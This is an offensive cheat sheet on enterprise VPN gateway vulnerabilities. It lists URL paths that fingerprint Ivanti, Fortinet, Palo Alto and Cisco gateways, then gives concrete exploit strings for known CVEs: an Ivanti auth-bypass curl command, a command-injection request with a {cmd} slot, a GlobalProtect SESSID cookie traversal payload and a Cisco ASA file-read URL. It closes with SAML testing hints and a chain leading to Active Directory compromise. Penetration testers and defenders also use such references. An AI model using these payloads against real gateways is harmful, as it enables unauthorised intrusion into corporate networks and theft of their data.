# Enterprise VPN Gateway Vulnerabilities Reference

## Attack Surface Signals
- **Ivanti / Pulse Connect Secure**: `/dana-na/`, `/dana/`, `/dana-cached/`, `/dana-ws/`.
- **Fortinet FortiGate SSL-VPN**: `/remote/login`, `/remote/hostcheck_installed`, `/remote/fgt_lang`.
- **Palo Alto GlobalProtect**: `/global-protect/login.esp`, `/global-protect/portal/css/`, `/ssl-vpn/`.
- **Cisco AnyConnect / ASA**: `/+CSCOE+/`, `/+CSCOT+/`, `/+CSCOL+/`.

## High-Impact CVE Signature Matrix
1. **Ivanti Connect Secure (CVE-2023-46805 / CVE-2024-21887)**:
   - Auth Bypass: `curl -k https://target/api/v1/totp/user-backup-code/../../system/system-information`
   - Command Injection: `POST /api/v1/license/keys-status/;{cmd};/`
2. **Fortinet SSL-VPN (CVE-2024-21762 / CVE-2022-42475)**:
   - Pre-auth RCE via out-of-bounds write in `ssl-vpn` daemon web interface.
3. **Palo Alto GlobalProtect (CVE-2024-3400)**:
   - Command injection via `SESSID` cookie in telemetry service:
     `Cookie: SESSID=../../../../opt/panlogs/tmp/device_telemetry/minute/`
4. **Cisco ASA / FTD (CVE-2020-3452 / CVE-2020-3187)**:
   - Path Traversal File Read: `https://target/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua`

## SAML SP Misconfigurations on VPNs
- Many enterprise VPNs delegate auth to Okta/Entra via SAML: test SAML assertion stripping and unsigned response handling.

## Exploit Chains
- **VPN Auth Bypass / Command Injection → Corporate Internal Network Pivot & Active Directory Compromise**.
